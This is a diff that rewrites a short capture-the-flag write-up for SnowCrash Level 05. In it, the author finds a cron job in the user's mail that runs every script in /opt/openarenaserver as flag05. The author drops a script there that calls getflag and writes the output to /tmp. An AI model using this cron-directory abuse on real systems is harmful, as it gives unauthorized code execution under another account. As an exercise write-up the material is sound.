@@ -1,36 +1,28 @@
-# Level05
+# Level 05
 
-On login you will see the following:
+This level is all about cron abuse.
 
-```
-You have new mail.
-```
+I saw mail notification, then checked:
 
-Checking on the internet, it seems there is something in `/var/mail`.
-
-```
-level05@SnowCrash:~$ cat /var/mail/level05
-*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+```bash
+cat /var/mail/level05
 ```
 
-It seems like it executes something as flag05. Lets check it out.
+It showed this:
 
-```
-level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
-#!/bin/sh
-
-for i in /opt/openarenaserver/* ; do
- (ulimit -t 5; bash -x "$i")
- rm -f "$i"
-done
+```text
+su -c "sh /usr/sbin/openarenaserver" - flag05
 ```
 
-It seems to execute all programs in `/opt/openarenaserver/`.
-We can definitly use this to our advantage.
+That script runs files from /opt/openarenaserver, so I dropped my own:
 
+```bash
+echo 'getflag > /tmp/flag05.txt' > /opt/openarenaserver/exploit.sh
+chmod +x /opt/openarenaserver/exploit.sh
 ```
-echo 'getflag > /tmp/flag' > /opt/openarenaserver/exploit.sh
 
-#once the cronjob is done, it will show in the correct file
-cat /tmp/flag
+Wait for cron tick, then:
+
+```bash
+cat /tmp/flag05.txt
 ```
